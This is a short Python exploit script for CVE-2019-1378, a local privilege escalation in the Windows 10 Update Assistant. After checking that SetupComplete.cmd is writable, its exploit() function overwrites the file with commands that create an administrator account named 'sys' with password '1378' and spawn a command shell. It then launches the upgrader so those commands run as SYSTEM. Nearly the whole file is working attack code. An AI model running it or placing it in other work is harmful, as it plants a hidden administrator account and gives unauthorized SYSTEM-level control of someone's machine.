import os
"""
Service: Microsoft Windows
Version: 1903
Vulnerability Type: Local Privilege Escalation to NT-AUTHORITY/SYSTEM
Vulnerable Component: Windows Update Manager (WUA)
CVE: https://nvd.nist.gov/vuln/detail/CVE-2019-1378
"""

# Checking Function
def all_checks():
    existence = True if os.path.isdir("C:\Windows10Upgrade") else False

    if existence:
        if os.path.isfile("C:\$GetCurrent\SafeOS\SetupComplete.cmd"):
            print("System possibly vulnerable to CVE-2019-1378, proceeding to permission checks.")
        else:
            return False
    else:
        print("Windows Update Manager is not installed on this system.")
        return False

    # File Permission checks:
    if os.access("C:\$GetCurrent\SafeOS\SetupComplete.cmd", os.W_OK):
        print("User has permission to modify vulnerable files, proceeding to exploitation")
        return True
    else:
        print(f"Permission denied on files.")
        return False
# Exploit
def exploit():
    exploit_str = "@echo off\nnet user /add sys 1378\nnet localgroup administrators sys /add\ncall cmd.exe\npause"
    with open("C:\$GetCurrent\SafeOS\SetupComplete.cmd", 'w') as f:
        f.write(exploit_str)
    os.system("C:\Windows10Upgrade\Windows10UpgraderApp.exe")
# Main
def main():
    if all_checks():
        exploit()
    else:
        print("System not vulnerable.")
        exit()
if __name__ == '__main__':
    main()
